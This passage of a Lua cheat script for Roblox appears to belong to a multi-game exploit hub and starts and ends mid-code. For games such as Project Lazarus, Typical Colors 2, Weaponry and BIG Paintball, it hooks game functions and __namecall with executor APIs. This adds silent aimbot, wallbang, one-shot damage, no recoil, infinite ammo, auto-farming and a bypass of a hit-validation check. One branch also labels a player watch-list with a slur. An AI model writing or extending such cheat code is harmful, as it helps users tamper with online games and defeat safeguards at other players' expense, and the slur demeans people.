				b.config.firing.auto = library.flags[GameTitle .. " Automatic Weapons"] and true or Old_config.firing.auto
				b.config.firing.mode = library.flags[GameTitle .. " Automatic Weapons"] and "auto" or Old_config.firing.mode

				b.config.recoil.hipfire.min = library.flags[GameTitle .. " No Recoil"] and CFrame.new() or Old_config.recoil.hipfire.min
				b.config.recoil.hipfire.max = library.flags[GameTitle .. " No Recoil"] and CFrame.new() or Old_config.recoil.hipfire.max
				b.config.recoil.ADS.min = library.flags[GameTitle .. " No Recoil"] and CFrame.new() or Old_config.recoil.ADS.min
				b.config.recoil.ADS.max = library.flags[GameTitle .. " No Recoil"] and CFrame.new() or Old_config.recoil.ADS.max
				b.config.recoil.camera.min = library.flags[GameTitle .. " No Recoil"] and CFrame.new() or Old_config.recoil.camera.min
				b.config.recoil.camera.max = library.flags[GameTitle .. " No Recoil"] and CFrame.new() or Old_config.recoil.camera.max

				b.config.equipTime = library.flags[GameTitle .. " Quickdraw"] and 0 or Old_config.equipTime

				Old_fire(b, ...)
			end

		elseif GameTitle == "Project Lazarus" then

			local LazarusTab = library:AddTab"Project Lazarus"
			local LazarusColumn = LazarusTab:AddColumn()
			local LazarusColumn1 = LazarusTab:AddColumn()
			local LazarusMain = LazarusColumn:AddSection"Main"
			library.options["Aimbot Mode"]:AddValue"Silent"
			LazarusMain:AddToggle({text = "Wallbang"})
			LazarusMain:AddToggle({text = "Speed"}):AddSlider({text = "Multiplier", min = 1, max = 4, float = 0.1})

			AddTracker(workspace.Baddies)

			local OriginalValues = {}
			spawn(function()
				while wait(2) do
					for i,v in next, getgc(true) do
						if typeof(v) == "table" and rawget(v, "FireTime") then
							if not OriginalValues[v] then
								OriginalValues[v] = v
							end
							local old = OriginalValues[v]
							--print(old.Spread.Min)
							--v.MagSize = library.flags["Inf Ammo"] and math.huge or old.MagSize
							--v.MaxAmmo = library.flags["Inf Ammo"] and math.huge or old.MaxAmmo

							v.FireTime = library.flags[GameTitle .. " Quickfire"] and 0 or old.FireTime

							--v.Semi = library.flags["Full-auto"] and false or old.Semi
							--v.SingleAction = library.flags["Full-auto"] and false or old.SingleAction

							v.ShellReload = library.flags[GameTitle .. " Instant Reload"] and math.huge or old.ShellReload

							v.Spread.Min = library.flags[GameTitle .. " No Spread"] and 0 or old.Spread.Min
							v.Spread.Max = library.flags[GameTitle .. " No Spread"] and 0 or old.Spread.Max
							v.AimSpread = library.flags[GameTitle .. " No Spread"] and 0 or old.AimSpread

							--v.Drop.Start = library.flags["Inf Range"] and math.huge or require(old).Drop.Start
							--v.Drop.End = library.flags["Inf Range"] and math.huge or require(old).Drop.Start

							v.ViewKick.Pitch.Min = library.flags[GameTitle .. " No Recoil"] and 0 or old.ViewKick.Pitch.Min
							v.ViewKick.Pitch.Max = library.flags[GameTitle .. " No Recoil"] and 0 or old.ViewKick.Pitch.Max
							v.ViewKick.Yaw.Min = library.flags[GameTitle .. " No Recoil"] and 0 or old.ViewKick.Yaw.Min
							v.ViewKick.Yaw.Max = library.flags[GameTitle .. " No Recoil"] and 0 or old.ViewKick.Yaw.Max

							v.AimTime = library.flags["Fast Aim"] and 0 or old.AimTime

							v.GunKick = library.flags["No Gun-kick"] and 0 or old.GunKick

							v.BulletPenetration = library.flags[GameTitle .. " Oneshot"] and math.huge or old.BulletPenetration
							v.HeadShot = library.flags[GameTitle .. " Oneshot"] and math.huge or old.HeadShot
							v.TorsoShot = library.flags[GameTitle .. " Oneshot"] and math.huge or old.TorsoShot
							v.LimbShot = library.flags[GameTitle .. " Oneshot"] and math.huge or old.LimbShot

							v.MoveSpeed = library.flags[GameTitle .. " Speed"] and library.flags[GameTitle .. " Multiplier"] or old.MoveSpeed
							v.AimMoveSpeed = library.flags[GameTitle .. " Speed"] and library.flags[GameTitle .. " Multiplier"] or old.AimMoveSpeed
						end
					end
				end
			end)

			local WeaponMods = LazarusColumn1:AddSection"Weapon Mods"
			WeaponMods:AddToggle({text = "Oneshot"})
			WeaponMods:AddToggle({text = "No Recoil"})
			WeaponMods:AddToggle({text = "No Spread"})
			WeaponMods:AddToggle({text = "No Gun-kick"})
			--WeaponMods:AddToggle({text = "Inf Ammo"})
			WeaponMods:AddToggle({text = "Quickfire"})
			WeaponMods:AddToggle({text = "Fast Aim"})
			WeaponMods:AddToggle({text = "Instant Reload"})
			--WeaponMods:AddToggle({text = "Full-Auto"})

		elseif GameTitle == "State Of Anarchy" then

			local SoATab = library:AddTab"State of Anarchy":AddColumn()

			local SoAMain = SoATab:AddSection"Main"
			library.options["Aimbot Mode"]:AddValue"Silent"
			SoAMain:AddToggle({text = "Wallbang"})
			--SoAWindow:AddToggle({text = "Always Headshot"})
			--SoAWindow:AddToggle({text = "No Recoil"})

			local AimHook
			AimHook = hookfunction(workspace.FindPartOnRayWithIgnoreList, function(self, ...)
				local Args = {...}
				if tostring(Args[2][1]) == "Projectiles" then
					if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
						Args[1] = Ray.new(Camera.CFrame.p, (library.Aimbot.Position3d - Camera.CFrame.p).unit * library.flags["Aimbot Max Distance"])
					end
					if library.flags[GameTitle .. " Wallbang"] then
						local n = #Args[2]
						Args[2][n + 1] = workspace.Map
						Args[2][n + 2] = workspace.Terrain
					end
				end
				return AimHook(self, unpack(Args))
			end)

		elseif GameTitle == "Zombie Rush" then

			spawn(function()
				while library and wait(1) do
					for i,v in next, getreg() do
						if typeof(v) == "function" then
							local values = getupvalues(v)
							local func = values[6] and type(values[6]) == "function" and values[6]
							if func then
								local Weapon = getupvalue(func, 25)
								local Config = FFC(Client.Backpack, Weapon.Name)
								Config = Config or FFC(Client.Character, Weapon.Name)
								Config = Config and Config.Configuration
								setupvalue(func, 4, library.flags[GameTitle .. " Quickfire"] and 50 or Config.Firerate.Value) 
								setupvalue(func, 16, library.flags[GameTitle .. " No Spread"] and 0 or Config.Spread.Value) -- spread
								setupvalue(func, 26, library.flags[GameTitle .. " Automatic Weapons"] and true or Config.FullAuto.Value) -- automatic
							end
						end
					end
				end
			end)

			local ZRushTab = library:AddTab"Zombie Rush"
			local ZRushColumn = ZRushTab:AddColumn()
			--local ZRushColumn1 = ZRushTab:AddColumn()

			local ZRushMain = ZRushColumn:AddSection"Main"
			library.options["Aimbot Mode"]:AddValue"Silent"
			ZRushMain:AddToggle({text = "Wallbang"})

			local WeaponMods = ZRushColumn:AddSection"Weapon Mods"
			WeaponMods:AddToggle({text = "No Spread"})
			WeaponMods:AddToggle({text = "Quickfire"})
			WeaponMods:AddToggle({text = "Automatic Weapons"})

			AddTracker(workspace["Zombie Storage"])

		elseif GameTitle == "Zombie Attack" then

			local GunData = RepStorage:WaitForChild"GunData"
			GunData = require(GunData)

			local function ApplyMods()
				for i,v in next, getreg() do
					if typeof(v) == "function" then
						local values = getupvalues(v)
						if OldCallingScript().Name == "GunController" and #values >= 25 then
							local Data = GunData[values[1].Name]
							setupvalue(v, 12, library.flags[GameTitle .. " Automatic Weapons"] and true or Data.Automatic) 
							setupvalue(v, 23, library.flags[GameTitle .. " No Spread"] and 0 or Data.Spread.Min)
							setupvalue(v, 24, library.flags[GameTitle .. " No Spread"] and 0 or Data.Spread.Max)
						end
					end
				end
			end

			local ZAttackTab = library:AddTab"Zombie Attack"
			--local ZAttackColumn = ZAttackTab:AddColumn()
			local ZAttackColumn1 = ZAttackTab:AddColumn()

			--local ZAttackMain = ZAttackColumn:AddSection"Main"
			library.options["Aimbot Mode"]:AddValue"Silent"
			--ZAttackWindow:AddToggle({text = "Wallbang"})
			--ZAttackWindow:AddToggle({text = "Always Headshot"})

			local WeaponMods = ZAttackColumn1:AddSection"Weapon Mods"
			WeaponMods:AddToggle({text = "No Spread", callback = function() ApplyMods() end})
			WeaponMods:AddToggle({text = "Automatic Weapons", callback = function() ApplyMods() end})

			library:AddConnection(Client.Backpack.ChildAdded, function()
				wait(2)
				ApplyMods()
			end)

			local Connection
			library:AddConnection(Client.CharacterAdded, function(Char)
				Connection = library:AddConnection(Char.ChildAdded, function()
					wait(2)
					ApplyMods()
				end)
			end)

			AddTracker(workspace.enemies)
			AddTracker(workspace.BossFolder)

		elseif GameTitle == "Infection" then

			local InfectionTab = library:AddTab"Infection"
			local InfectionMain = InfectionTab:AddSection"Main"
			--library.options["Aimbot Mode"]:AddValue"Silent"
			--InfectionWindow:AddToggle({text = "Wallbang"})

			--aaa

		elseif GameTitle == "Resurrection" then

			local gc = getgc(true)
			spawn(function()
				while library do
					wait(1)
					for i,v in next, gc do
						if typeof(v) == "table" and rawget(v, "ammoleft") then
							if library.flags[GameTitle .. " Inf Ammo"] then
								v.ammoleft = library.flags[GameTitle .. " Inf Ammo"] and math.huge
								v.ammo = library.flags[GameTitle .. " Inf Ammo"] and math.huge
							else
								if v.ammoleft == math.huge then
									v.ammoleft = v.info.spareammo
									v.ammo = v.info.ammo
								end
							end
							v.automatic = library.flags[GameTitle .. " Automatic Weapons"] and true or v.info.automatic
							v.recoil = library.flags[GameTitle .. " No Recoil"] and 0 or v.info.recoil
							v.maxspread = library.flags[GameTitle .. " No Spread"] and 0 or 0.1
							v.minspread = library.flags[GameTitle .. " No Spread"] and 0 or 0.01
							v.RPM = library.flags[GameTitle .. " Quickfire"] and 1000 or v.info.RPM
						end
					end
				end
			end)

			local ResurrectionTab = library:AddTab"Resurrection"
			local ResurrectionColumn = ResurrectionTab:AddColumn()
			local ResurrectionColumn1 = ResurrectionTab:AddColumn()

			local ResurrectionMain = ResurrectionColumn:AddSection"Main"
			library.options["Aimbot Mode"]:AddValue"Silent"
			ResurrectionMain:AddToggle({text = "Wallbang"})

			local WeaponMods = ResurrectionColumn1:AddSection"Weapon Mods"
			WeaponMods:AddToggle({text = "No Recoil"})
			WeaponMods:AddToggle({text = "No Spread"})
			WeaponMods:AddToggle({text = "Quickfire"})
			WeaponMods:AddToggle({text = "Inf Ammo"})
			WeaponMods:AddToggle({text = "Automatic Weapons"})

			AddTracker(workspace.NPCs)

		elseif GameTitle == "Typical Colors 2" then

			local firebullet
			for _,Func in next, getgc() do
				if typeof(Func) == "function" then
					local Info = debug.getinfo(Func)
					if debug.getinfo(Func).name == "firebullet" then
						firebullet = Func
					end
				end
			end

			local TC2Tab = library:AddTab"Typical Colors 2":AddColumn()

			local TC2Main = TC2Tab:AddSection"Main"
			library.options["Aimbot Mode"]:AddValue"Silent"
			TC2Main:AddToggle({text = "Wallbang"})
			TC2Main:AddToggle({text = "Inf Jump"})
			TC2Main:AddToggle({text = "Quickfire"})

			local Jumping
			--local Quickfire
			local function StartLoop()
				--if Quickfire then
				--	while Quickfire and wait() do
				--		firebullet()
				--	end
				--end
				if Jumping then
					while library and Jumping and wait() do
						local Char = Players[Client].Character
						if Char then
							Char.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
						end
					end
				end
			end

			library:AddConnection(inputService.InputBegan, function(Input)
				if library.flags[GameTitle .. " Inf Jump"] and not inputService:GetFocusedTextBox() then
					if Input.KeyCode.Name == "Space" then
						Jumping = true
						StartLoop()
					end
					--if Input.UserInputType.Name == "MouseButton1" then
					--	Quickfire = true
					--	StartLoop()
					--end
				end
			end)

			library:AddConnection(inputService.InputEnded, function(Input)
				if Input.KeyCode.Name == "Space" then
					Jumping = false
				end
				--if Input.UserInputType.Name == "MouseButton1" then
				--	Quickfire = false
				--end
			end)

			local TC2ncall
			TC2ncall = hookmetamethod(game, "__namecall", function(self, ...)
				if checkcaller() then return TC2ncall(self, ...) end

				local Args = {...}
				local Method = getnamecallmethod()

				if Method == "FireServer" then
					if self.Name == "CreateProjectile" then
						if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
							Args[2] = library.Aimbot.Position3d
							Args[3] = CFrame.new(library.Aimbot.Position3d + Vector3.new(0, 0.5, 0))
							Args[5] = library.Aimbot.Position3d + Vector3.new(0, 0.5, 0)
						end
					end

				end

				if Method == "FindPartOnRayWithIgnoreList" then
					if library.flags[GameTitle .. " Wallbang"] and Args[2][1].Name == "Clips" then
						local n = #Args[2]
						Args[2][n + 1] = workspace.Map
					end
					if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
						Args[1] = Ray.new(Camera.CFrame.p, (library.Aimbot.Position3d - Camera.CFrame.p).Unit * library.flags["Aimbot Max Distance"])
					end
				end
				return TC2ncall(self, unpack(Args))
			end)

		elseif GameTitle == "Blackhawk Rescue Mission" then

			--local BRMTab = library:AddTab"Blackhawk Rescue Mission":AddColumn()
			--local BRMMain = BRMTab:AddSection"Main"

			library.options["Aimbot Mode"]:AddValue"Silent"
			--BRMMain:AddToggle({text = "Wallbang"})

			AddTracker(workspace.Custom["-1"])

		elseif GameTitle == "Shoot Out" then

			--local SOTab = library:AddTab"Shoot Out":AddColumn()
			--local SOMain = SOTab:AddSection"Main"

			library.options["Aimbot Mode"]:AddValue"Silent"
			--SOMain:AddToggle({text = "Wallbang"})

			local OldValues = {}
			local function ApplyMods()
				for i,v in next, getgc(true) do
					if typeof(v) == "table" and rawget(v, "ROF") and v ~= OldValues[v.NAME] then
						if not OldValues[v.NAME] then
							OldValues[v.NAME] = v
						end
						--for i2,v2 in next, v do print(i2, v2) end
						v.ROF = library.flags[GameTitle .. " Quickfire"] and math.huge or OldValues[v.NAME].ROF
						v.AUTOMATIC = library.flags[GameTitle .. " Automatic Weapons"] and true or OldValues[v.NAME].AUTOMATIC
						v.SPREAD = library.flags[GameTitle .. " No Spread"] and 0 or OldValues[v.NAME].SPREAD
						v.RECOIL_STRENGTH = library.flags[GameTitle .. " No Recoil"] and 0 or OldValues[v.NAME].RECOIL_STRENGTH
						v.RELOAD_TIME = library.flags[GameTitle .. " Fast Reload"] and 0 or OldValues[v.NAME].RELOAD_TIME
						--v.MAX_AMMO = library.flags[GameTitle .. " Inf Ammo"] and math.huge or OldValues[v.NAME].MAX_AMMO
					end
				end
			end

			--local WeaponMods = SOTab:AddSection"Weapon Mods"
			--WeaponMods:AddToggle({text = "No Recoil", callback = ApplyMods})
			--WeaponMods:AddToggle({text = "No Spread", callback = ApplyMods})
			--WeaponMods:AddToggle({text = "Quickfire", callback = ApplyMods})
			--WeaponMods:AddButton({text = "Inf Ammo", callback = function() ApplyMods() end})
			--WeaponMods:AddToggle({text = "Fast Reload", callback = ApplyMods})
			--WeaponMods:AddToggle({text = "Automatic Weapons", callback = ApplyMods})

			local function SetTeams()
				for i,v in next, getreg() do
					if typeof(v) == "table" and rawget(v, "Cowboys") then
						Cowboys = v.Cowboys
						Sheriffs = v.Sheriffs
					end
				end
			end
			SetTeams()

			spawn(function()
				while library and wait(5) do
					SetTeams()
				end
			end)

		elseif GameTitle == "Weaponry" then

			local Shoot, Recoil
			repeat wait(1)
				for i,v in next, getgc(true) do
					if typeof(v) == "function" and not iskrnlclosure(v) then
						local info = debug.getinfo(v)
						if info.name == "EnableShoot" then
							Shoot = v
						elseif info.name == "RecoilEffects" then
							Recoil = v
						elseif info.name == "checkIsHitPlayerValid" then
							v = function() return true end
						end
					end
				end
			until Shoot and Recoil

			local Framework = getsenv(Client.PlayerScripts["Client_Major_Framework"])
			local PauseFunc = getconstant(Framework.PauseWeapon, 2)

			local WeaponryTab = library:AddTab"Weaponry"
			local WeaponryColumn = WeaponryTab:AddColumn()
			--local WeaponryColumn1 = WeaponryTab:AddColumn()

			local WeaponryMain = WeaponryColumn:AddSection"Main"
			library.options["Aimbot Mode"]:AddValue"Silent"
			--WeaponryMain:AddToggle({text = "Wallbang"})

			local WeaponMods = WeaponryColumn:AddSection"Weapon Mods"
			WeaponMods:AddToggle({text = "No Recoil"})
			WeaponMods:AddToggle({text = "No Spread"})
			WeaponMods:AddToggle({text = "Inf Ammo"})
			WeaponMods:AddToggle({text = "Inf Range"})
			WeaponMods:AddToggle({text = "Quickfire"})
			--WeaponMods:AddToggle({text = "High Velocity", callback = ApplyMods})
			--WeaponMods:AddToggle({text = "Automatic Weapons", callback = ApplyMods})

			local Stats = {}
			local ShootHook
			ShootHook = hookfunction(Shoot, function()
				local Values = getupvalues(ShootHook)
				local WeaponStats = Values[3]

				local RealStats = Stats[WeaponStats.WeaponName]
				if not RealStats then
					Stats[WeaponStats.WeaponName] = WeaponStats
					RealStats = Stats[WeaponStats.WeaponName]
				end

				if library.flags[GameTitle .. " No Spread"] then
					WeaponStats.CurrentAccuracy = 0
				end

				if library.flags[GameTitle .. " Inf Ammo"] then
					WeaponStats.CurrentAmmo = WeaponStats.MaxAmmo
				end

				if library.flags[GameTitle .. " Quickfire"] then
					WeaponStats.FireRate = 0
					WeaponStats.CanShoot = true
					WeaponStats.IsShooting = false
				else
					WeaponStats.FireRate = RealStats.FireRate
				end

				WeaponStats.Range = library.flags[GameTitle .. " Inf Range"] and 10000 or RealStats.Range

				return ShootHook()
			end)

			local RecoilHook
			RecoilHook = hookfunction(Recoil, function()
				return not library.flags[GameTitle .. " No Recoil"] and RecoilHook()
			end)

		elseif GameTitle == "Boxing Simulator" then

			AimbotTab.canInit = false
			VisualsTab.canInit = false

			local BSTab = library:AddTab"Boxing Simulator"
			local BSColumn = BSTab:AddColumn()
			local BSColumn1 = BSTab:AddColumn()

			local BSAutomation = BSColumn:AddSection"Automation"
			BSAutomation:AddToggle({text = "Punch", flag = "Auto Punch", callback = function(State)
				if State then
					while library and library.flags[GameTitle .. " Auto Punch"] and wait() do
						local Char = Client.Character
						if FFCoC(Char, "Humanoid") then
							local Tool = FFCoC(Char, "Tool")
							if Tool then
								Tool:Activate()
							else
								for i, v in next, Client.Backpack:GetChildren() do
									if v:IsA("Tool") then
										Char.Humanoid:EquipTool(v)
									end
								end
							end
						end
					end
				end
			end})
			BSAutomation:AddToggle({text = "Sell", flag = "Auto Sell", callback = function(State)
				if State then
					while library and library.flags[GameTitle .. " Auto Sell"] and wait(5) do
						RepStorage.Events.SellRequest:FireServer()
					end
				end
			end})
			BSAutomation:AddToggle({text = "Capture Flags", flag = "ACF", callback = function(State)
				if State then
					while library and library.flags[GameTitle .. " ACF"] and wait(1) do
						local Char = Client.Character
						if FFC(Char, "HumanoidRootPart") then
							for i,v in next, workspace.Flags:GetChildren() do
								if v.Flag.Player.Info.PlayerName.Text ~= Client.Name then
									Char.HumanoidRootPart.CFrame = v.Hitbox.CFrame + Vector3.new(0, 5, 0)
									wait(10)
								end
							end
						end
					end
				end
			end})
			BSAutomation:AddToggle({text = "Collect", flag = "Collect", callback = function(State)
				if State then
					while library and library.flags[GameTitle .. " Collect"] and wait() do
						local Char = Client.Character
						if FFC(Char, "HumanoidRootPart") then
							if library.flags[GameTitle .. " C Filter"]["Coins"] then
								for i,v in next, workspace.Coins:GetChildren() do
									v.HumanoidRootPart.CFrame = Char.HumanoidRootPart.CFrame
								end
							end
							if library.flags[GameTitle .. " C Filter"]["Event Items"] then
								for i,v in next, workspace.Canes:GetChildren() do
									v.HumanoidRootPart.CFrame = Char.HumanoidRootPart.CFrame
								end
							end
						end
					end
				end
			end}):AddList({text = "Filter", flag = "C Filter", values = {"Coins", "Event Items"}, multiselect = true})

			local GlovesRemote = FFC(RepStorage.Events, "BuyAllGlove")
			local DNARemote = FFC(RepStorage.Events, "BuyAllDNA")
			local ClassRemote = FFC(RepStorage.Events, "BuyClass")
			BSAutomation:AddToggle({text = "Upgrade", flag = "Upgrade", callback = function(State)
				if State then
					while library and library.flags[GameTitle .. " Upgrade"] and wait(1) do
						if library.flags[GameTitle .. " U Filter"]["Gloves"] then
							GlovesRemote:FireServer()
						end
						if library.flags[GameTitle .. " U Filter"]["DNA"] then
							DNARemote:FireServer()
						end
						if library.flags[GameTitle .. " U Filter"]["Class"] then
							for i = 1,30 do
								ClassRemote:FireServer(i)
								wait(0.1)
							end
						end
					end
				end
			end}):AddList({text = "Filter", flag = "U Filter", values = {"Gloves", "DNA", "Class"}, multiselect = true})

			local FarmingSection = BSColumn:AddSection"Farming"
			--FarmingSection:AddToggle({text = "Enabled", flag = "Farming"})

		elseif GameTitle == "Citadel Of Adun" then

			spawn(function()
				while library and wait(5) do
					local CPos = Client.PlayerGui.CursorGui:WaitForChild"Mouse":WaitForChild"Icon".AbsolutePosition
					local CSize = Client.PlayerGui.CursorGui.Mouse.Icon.AbsoluteSize / 2
					library.options["MXO Amount"]:SetValue((Mouse.X <= CPos.X and (CPos.X - Mouse.X) or (Mouse.X - CPos.X)) + CSize.X)
					library.options["MYO Amount"]:SetValue((Mouse.Y <= CPos.Y and (Mouse.Y - CPos.Y) or (CPos.Y - Mouse.Y)) + CSize.Y)
				end
			end)

		elseif GameTitle == "Dust" then

			local Retards = {
			}

			for _, Player in next, game.Players:GetChildren() do
				if Retards[Player.UserId] then
					library:SendNotification(10, "A " .. Retards[Player.UserId] .. "(" .. Player.Name .. ") is in your game!")
				end
			end

			library:AddConnection(game.Players.PlayerAdded, function(Player)
				if Retards[Player.UserId] then
					library:SendNotification(10, "A " .. Retards[Player.UserId] .. "(" .. Player.Name .. ") has joined your game!")
				end
			end)

		elseif GameTitle == "BIG Paintball" then

			local FireFunc
			repeat wait(1)
				for i,v in next, getgc(true) do
					if type(v) == "table" and rawget(v, "Projectiles") then
						FireFunc = v.Projectiles.Fire
					end
				end
			until FireFunc

			local o
			o = hookfunction(FireFunc, function(Player, CF, ...)
				if library and library.flags["Aimbot Mode"] == "Silent" then
					if Player == Client and library.Aimbot.Position3d then
						CF = CFrame.new(CF.Position, library.Aimbot.Position3d)
					end
				end
				return o(Player , CF, ...)
			end)

			--gun mods
			local DefaultGunStats = {}
			for i,v in next, RepStorage.Framework.Modules["1 | Directory"].Guns:GetChildren() do
				if v.ClassName == 'ModuleScript' then
					local gunModule = require(v)
					for aa, bb in next, gunModule do
						gunModule = bb
					end

					DefaultGunStats[v.Name] = {
						automatic = gunModule.automatic or nil;
						shotrate = gunModule.shotrate or nil;
						velocity = gunModule.velocity or nil;
					}
				end
			end

			function UpdateGunMod()
				for i,v in next, RepStorage.Framework.Modules["1 | Directory"].Guns:GetChildren() do
					if v.ClassName == 'ModuleScript' then
						local gunModule = require(v)
						for aa, bb in next, gunModule do
							gunModule = bb
						end
						gunModule.automatic = library.flags[GameTitle .. " Automatic Weapons"] or DefaultGunStats[v.Name]["automatic"]
						gunModule.shotrate = library.flags[GameTitle .. " Quickfire"] and 0 or DefaultGunStats[v.Name]["shotrate"]
						gunModule.velocity = library.flags[GameTitle .. " Instant Hit"] and 9e9 or DefaultGunStats[v.Name]["velocity"]
					end
				end
			end

			local BPTab = library:AddTab"BIG Paintball"
			local BPColumn = BPTab:AddColumn()
			--local BPColumn1 = BPTab:AddColumn()

			--local BPMain = BPColumn:AddSection"Main"
			library.options["Aimbot Mode"]:AddValue"Silent"
			--BPMain:AddToggle({text = "Wallbang"})

			local WeaponMods = BPColumn:AddSection"Weapon Mods"
			WeaponMods:AddToggle({text = "Quickfire", callback = UpdateGunMod})
			WeaponMods:AddToggle({text = "Instant Hit", callback = UpdateGunMod})
			WeaponMods:AddToggle({text = "Automatic Weapons", callback = UpdateGunMod})

		elseif GameTitle == "Giant Survival" then

			AimbotTab.canInit = false
			VisualsTab.canInit = false
			--gun mods
			local DefaultGunStats = {}
			local gunModule = require(RepStorage.Framework.Modules["7 | Weapon"])
			for i, v in next, gunModule.weapons do
				DefaultGunStats[v.name] = {auto = v.auto, rate = v.rate, velocity = v.velocity}
			end	

			function UpdateGunMod()
				for i, v in next, gunModule.weapons do
					v.auto = library.flags[GameTitle .. " Automatic Weapons"] or DefaultGunStats[v.name]["auto"]
					v.rate = library.flags[GameTitle .. " Quickfire"] and 0 or DefaultGunStats[v.name]["rate"]
					v.velocity = library.flags[GameTitle .. " Instant Hit"] and 9e9 or DefaultGunStats[v.name]["velocity"]
				end
			end

			local GSTab = library:AddTab"BIG Paintball"
			local GSColumn = GSTab:AddColumn()
			local GSColumn1 = GSTab:AddColumn()

			local GSMain = GSColumn:AddSection"Main"
			GSMain:AddList({text = "Equip Gun", values = {"Crazy Futuristic Minigun","Black Hole Gun","Golden Pistol", "Biochemical Blaster","Space Rifle","Ray Gun","SCAR","Lava Pistol","Sniper Rifle","Minigun","Plunger Rifle", "SMG","Double Barrel Shotgun","Fireworks Launcher","Paintball Gun","Potato Launcher","Banana Pistol","Revolver","Slingshot","Crossbow"}, max = 10, callback = function(Value)
				workspace["__THINGS"]["__REMOTES"].weaponequipped:FireServer({{Value}, {false}})
				if FFCoC(Client.Character, "Humanoid") then
					Client.Character.Humanoid.Health = 0
				end
			end})
			GSMain:AddList({text = "Equip Gear", values = {"Infinity Coil","Cash Magnet","Super Speed Coil","Super Gravity Coil","Speed Coil","Gravity Coil"}, max = 10, callback = function(Value)
				workspace["__THINGS"]["__REMOTES"].gearequipped:FireServer({{Value}, {false}})
				if FFCoC(Client.Character, "Humanoid") then
					Client.Character.Humanoid.Health = 0
				end
			end})
			--BPMain:AddToggle({text = "Wallbang"})

			local WeaponMods = GSColumn1:AddSection"Weapon Mods"
			WeaponMods:AddToggle({text = "Quickfire", callback = UpdateGunMod})
			WeaponMods:AddToggle({text = "Instant Hit", callback = UpdateGunMod})
			WeaponMods:AddToggle({text = "Automatic Weapons", callback = UpdateGunMod})

		elseif GameTitle == "Lumberjack Legends" then
			AimbotTab.canInit = false
			VisualsTab.canInit = false

			local LLTab = library:AddTab"Lumberjack Legends"
			local LLColumn = LLTab:AddColumn()
			local LLColumn1 = LLTab:AddColumn()

			local LLMain = LLColumn:AddSection"Main"
			LLMain:AddButton({text = "Massive Backpack", callback = function()
				RepStorage.EquipBackpackRequest:InvokeServer(79)
			end})
			local EquipToolRequest = RepStorage.EquipToolRequest
			LLMain:AddButton({text = "Equip your best Axe", callback = function()
				local AxeValue = Client.leaderstats["Axe Level"].Value
				for i = AxeValue, 158 do
					EquipToolRequest:InvokeServer(Client.Character:WaitForChild("Axe"), i)
				end
			end})

			local LLAutomation = LLColumn1:AddSection"Automation"
			LLAutomation:AddToggle({text = "Collect Coins", callback = function()
				while library and library.flags[GameTitle .. "Collect Coins"] do
					wait(2.5)
					if Client.Character and FFC(Client.Character, "HumanoidRootPart") then
						for i,v in next, workspace.Village.CoinSpawnHolderV2:GetChildren() do 
							if v.Name == "CoinSpawn" then
								v.CFrame = Client.Character.HumanoidRootPart.CFrame
							end
						end
						for i,v in next, workspace.Worlds:GetChildren() do
							if FFC(v, "CoinSpawnHolder") then
								for z,x in next, v.CoinSpawnHolder:GetChildren() do 
									if x.Name == "CoinSpawn" then
										x.CFrame = Client.Character.HumanoidRootPart.CFrame
									end
								end
							end
						end
					end
				end
			end})

		elseif GameTitle == "Magnet Simulator" then



		elseif GameTitle == "Death Zone" then

			getsenv(Client.Backpack:WaitForChild(" ")).boom = function() end

			library:AddConnection(Client.CharacterAdded, function(Char)
				Char:WaitForChild"FallDamage":Destroy()
			end)
			delay(1, function()
				Players[Client].Character:WaitForChild"FallDamage":Destroy()
			end)

			local DZTab = library:AddTab"Death Zone"
			local DZColumn = DZTab:AddColumn()
			local DZColumn1 = DZTab:AddColumn()

			library.options["Aimbot Mode"]:AddValue"Silent"

			local DZMain = DZColumn:AddSection"Main"
			DZMain:AddToggle({text = "Thirdperson", callback = function(State)
				if State then
					library:AddConnection(runService.RenderStepped, "Thirdperson", function()
						if library and library.flags[GameTitle .. " Thirdperson"] then
							Client.CameraMaxZoomDistance = library.flags[GameTitle .. " TP Distance"]
							Client.CameraMinZoomDistance = library.flags[GameTitle .. " TP Distance"]
						else
							library.connections["Thirdperson"]:Disconnect()
						end
					end)
				else
					Client.CameraMaxZoomDistance = 0
					Client.CameraMinZoomDistance = 0
				end
			end}):AddSlider({text = "Distance", flag = "TP Distance", min = 10, max = 50})
			DZMain:AddToggle({text = "Speed"}):AddSlider({text = "Amount", flag = "Speed Amount", min = 10, max = 100})
			DZMain:AddToggle({text = "Jump Power", callback = function(State)
				if State then
					library:AddConnection(runService.RenderStepped, "Jump", function()
						if library and library.flags[GameTitle .. " Jump Power"] then
							local Char = Players[Client].Character
							Char = Char and FFCoC(Char, "Humanoid")
							if Char then
								Char.JumpPower = library.flags[GameTitle .. " Jump Amount"]
							end
						else
							library.connections["Jump"]:Disconnect()
							local Char = Players[Client].Character
							Char = Char and FFCoC(Char, "Humanoid")
							if Char then
								Char.JumpPower = 50
							end
						end
					end)
				end
			end}):AddSlider({text = "Amount", flag = "Jump Amount", min = 50, max = 300})

			local OldWeaponValues = {}
			for _,v in next, RepStorage.GunSettings:GetChildren() do
				OldWeaponValues[v.Name] = {}
				for i,v2 in next, require(v) do
					if i ~= "aimoffset" then
						OldWeaponValues[v.Name][i] = v2
					end
				end
			end

			local AimOffsets = {
				["M1911"] = CFrame.new(-0.453000009, 0.601499975, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1),
				["M16"] = CFrame.new(-0.349999994, 0.294999987, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1),
				["870MCS"] = CFrame.new(-0.349999994, 0.449999988, 1.5, 1, 0, 0, 0, 1, 0, 0, 0, 1),
				["ACWR"] = CFrame.new(-0.35800001, 0.215000004, 0.800000012, 1, 0, 0, 0, 1, 0, 0, 0, 1),
				["AEK971"] = CFrame.new(-0.344999999, 0.402999997, 1.70000005, 1, 0, 0, 0, 1, 0, 0, 0, 1),
				["AK74M"] = CFrame.new(-0.349999994, 0.400000006, 1.25, 1, 0, 0, 0, 1, 0, 0, 0, 1),
				["ASVAL"] = CFrame.new(-0.353500009, 0.40200001, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1),
				["AUG"] = CFrame.new(-0.342500001, 0.104000002, 0.5, 1, 0, 0, 0, 1, 0, 0, 0, 1),
				["Beretta"] = CFrame.new(-0.451000005, 0.456, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1),
